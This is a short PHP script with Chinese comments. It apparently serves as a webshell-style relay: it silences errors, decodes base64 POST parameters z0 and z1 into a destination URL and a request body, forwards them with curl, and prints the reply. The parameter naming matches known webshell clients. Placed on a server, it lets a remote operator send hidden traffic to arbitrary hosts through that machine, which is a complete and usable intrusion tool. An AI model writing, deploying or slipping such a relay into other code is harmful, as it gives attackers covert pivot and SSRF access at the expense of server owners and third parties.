<?php

error_reporting(0);
@header('Content-Type: text/plain'); // 加上 @ 預防前面已有輸出導致 header 報錯

// 檢查是否為二進位/Byte 資料的輔助函式
function is_binary($data) {
    // 判斷是否包含非列印字元
    if (preg_match('~[^\x20-\x7E\t\r\n]~', $data)) {
        return true;
    }
    return false;
}

function http_post($url, $data, &$http_code)
{
    $ch = curl_init($url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_POST, true);

    // 根據資料型態動態決定 Content-Type
    if (is_binary($data)) {
        $content_type = 'Content-Type: application/octet-stream';
    } else {
        $content_type = 'Content-Type: application/x-www-form-urlencoded';
    }

    curl_setopt($ch, CURLOPT_POSTFIELDS, $data); 

    // 💡 PHP 5 舊版相容：將 [] 改為傳統的 array()
    curl_setopt($ch, CURLOPT_HTTPHEADER, array(
        $content_type
    ));

    curl_setopt($ch, CURLOPT_TIMEOUT, 15);
    $response = curl_exec($ch);
    $http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    curl_close($ch);

    return $response;
}

$z0 = $_POST['z0'];
$z1 = $_POST['z1'];

$url  = base64_decode($z0);
$data = base64_decode($z1);

$http_code = 0;
if (!empty($url)) {
    $body = http_post($url, $data, $http_code);
    echo $body;
}

?>